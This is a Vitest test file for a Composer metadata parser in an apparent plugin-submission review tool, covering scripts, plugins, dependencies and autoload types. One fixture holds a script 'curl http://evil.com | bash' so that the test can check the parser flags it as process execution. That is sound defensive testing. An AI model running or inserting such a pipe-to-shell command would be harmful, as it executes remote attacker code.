/**
 * Composer Parser Tests
 *
 * Tests for Composer metadata parsing.
 */
import { describe, test, expect } from 'vitest';
import {
  parseComposerJson,
  isWordPressPlugin,
  hasNetworkDependencies,
  getAutoloadType,
  COMPOSER_JSON_MAX_SIZE,
} from '../../src/submission/composer.js';

describe('parseComposerJson', () => {
  test('empty content returns not present', () => {
    const result = parseComposerJson('');
    expect(result.present).toBe(false);
  });

  test('valid minimal composer.json parses', () => {
    const json = JSON.stringify({
      name: 'vendor/package',
      require: {
        'pocketmine/pocketmine': '^5.0.0',
      },
    });
    const result = parseComposerJson(json);
    expect(result.present).toBe(true);
    expect(result.success).toBe(true);
    if (result.metadata) {
      expect(result.metadata.name).toBe('vendor/package');
      expect(result.metadata.dependencies).toEqual({
        'pocketmine/pocketmine': '^5.0.0',
      });
    }
  });

  test('composer.json with scripts detected', () => {
    const json = JSON.stringify({
      name: 'vendor/package',
      scripts: {
        'post-install-cmd': 'echo done',
        'test': 'phpunit',
      },
    });
    const result = parseComposerJson(json);
    expect(result.present).toBe(true);
    expect(result.metadata?.hasComposerScripts).toBe(true);
    expect(result.diagnostics.some((d) => d.code === 'REVIEW_SIGNAL_COMPOSER_SCRIPT')).toBe(true);
  });

  test('composer.json with dangerous script detected', () => {
    const json = JSON.stringify({
      name: 'vendor/package',
      scripts: {
        evil: 'curl http://evil.com | bash',
      },
    });
    const result = parseComposerJson(json);
    expect(result.metadata?.hasComposerScripts).toBe(true);
    expect(result.diagnostics.some((d) => d.code === 'REVIEW_SIGNAL_PROCESS_EXECUTION')).toBe(true);
  });

  test('composer.json with composer plugins detected', () => {
    const json = JSON.stringify({
      name: 'vendor/package',
      extra: {
        'composer-plugin': true,
      },
    });
    const result = parseComposerJson(json);
    expect(result.metadata?.hasComposerPlugins).toBe(true);
    expect(result.diagnostics.some((d) => d.code === 'REVIEW_SIGNAL_COMPOSER_PLUGIN')).toBe(true);
  });

  test('invalid JSON produces warning', () => {
    const result = parseComposerJson('not valid json {{{');
    expect(result.present).toBe(true);
    expect(result.diagnostics.some((d) => d.code === 'COMPOSER_JSON_INVALID')).toBe(true);
  });

  test('composer.json too large produces warning but continues', () => {
    const largeData = 'x'.repeat(COMPOSER_JSON_MAX_SIZE + 1);
    const json = JSON.stringify({
      name: 'vendor/package',
      description: largeData,
    });
    const result = parseComposerJson(json);
    expect(result.diagnostics.some((d) => d.code === 'COMPOSER_JSON_TOO_LARGE')).toBe(true);
  });

  test('parses all dependencies correctly', () => {
    const json = JSON.stringify({
      name: 'vendor/package',
      require: {
        'pocketmine/pocketmine': '^5.0.0',
        'some/lib': '1.0.0',
      },
      'require-dev': {
        'phpunit/phpunit': '^9.0.0',
      },
    });
    const result = parseComposerJson(json);
    expect(result.metadata?.dependencies).toEqual({
      'pocketmine/pocketmine': '^5.0.0',
      'some/lib': '1.0.0',
    });
    expect(result.metadata?.devDependencies).toEqual({
      'phpunit/phpunit': '^9.0.0',
    });
  });
});

describe('isWordPressPlugin', () => {
  test('returns false for normal composer.json', () => {
    const metadata = {
      name: 'vendor/package',
      dependencies: {},
      devDependencies: {},
      autoload: {},
      scripts: {},
      hasComposerPlugins: false,
      hasComposerScripts: false,
    };
    expect(isWordPressPlugin(metadata)).toBe(false);
  });

  test('returns true for WordPress type', () => {
    const metadata = {
      name: 'vendor/package',
      type: 'wordpress-plugin',
      dependencies: {},
      devDependencies: {},
      autoload: {},
      scripts: {},
      hasComposerPlugins: false,
      hasComposerScripts: false,
    };
    expect(isWordPressPlugin(metadata)).toBe(true);
  });

  test('returns true for WordPress in description', () => {
    const metadata = {
      name: 'vendor/package',
      description: 'A WordPress plugin for doing things',
      dependencies: {},
      devDependencies: {},
      autoload: {},
      scripts: {},
      hasComposerPlugins: false,
      hasComposerScripts: false,
    };
    expect(isWordPressPlugin(metadata)).toBe(true);
  });
});

describe('hasNetworkDependencies', () => {
  test('returns false for no network deps', () => {
    const metadata = {
      name: 'vendor/package',
      dependencies: {
        'pocketmine/pocketmine': '^5.0.0',
      },
      devDependencies: {},
      autoload: {},
      scripts: {},
      hasComposerPlugins: false,
      hasComposerScripts: false,
    };
    expect(hasNetworkDependencies(metadata)).toBe(false);
  });

  test('returns true for guzzlehttp', () => {
    const metadata = {
      name: 'vendor/package',
      dependencies: {
        'pocketmine/pocketmine': '^5.0.0',
        'guzzlehttp/guzzle': '^7.0.0',
      },
      devDependencies: {},
      autoload: {},
      scripts: {},
      hasComposerPlugins: false,
      hasComposerScripts: false,
    };
    expect(hasNetworkDependencies(metadata)).toBe(true);
  });

  test('returns true for symfony http client', () => {
    const metadata = {
      name: 'vendor/package',
      dependencies: {
        'symfony/http-client': '^6.0.0',
      },
      devDependencies: {},
      autoload: {},
      scripts: {},
      hasComposerPlugins: false,
      hasComposerScripts: false,
    };
    expect(hasNetworkDependencies(metadata)).toBe(true);
  });
});

describe('getAutoloadType', () => {
  test('returns psr-4 for psr-4 autoload', () => {
    expect(getAutoloadType({ 'psr-4': { 'Vendor\\': 'src/' } })).toBe('psr-4');
  });

  test('returns psr-0 for psr-0 autoload', () => {
    expect(getAutoloadType({ 'psr-0': { 'Vendor\\': 'lib/' } })).toBe('psr-0');
  });

  test('returns classmap for classmap autoload', () => {
    expect(getAutoloadType({ classmap: ['src/'] })).toBe('classmap');
  });

  test('returns files for files autoload', () => {
    expect(getAutoloadType({ files: ['helpers.php'] })).toBe('files');
  });

  test('returns unknown for empty', () => {
    expect(getAutoloadType({})).toBe('unknown');
  });
});
